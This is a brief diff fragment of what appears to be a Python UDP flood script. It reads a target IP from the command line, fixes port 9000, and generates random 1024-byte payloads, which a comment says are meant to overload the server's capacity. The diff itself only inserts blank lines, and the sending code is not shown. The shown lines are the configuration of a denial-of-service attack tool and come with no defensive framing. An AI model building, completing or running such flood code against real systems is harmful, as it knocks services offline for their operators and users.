@@ -12,8 +12,10 @@ import sys
 
 # target IP
 UDP_ADDRESS = sys.argv[1]
+
 # exposing port:9000
 UDP_PORT = 9000
+
 # generating dummy bytes to overload server's capacity fast
 MESSAGE = random._urandom(1024) 
 
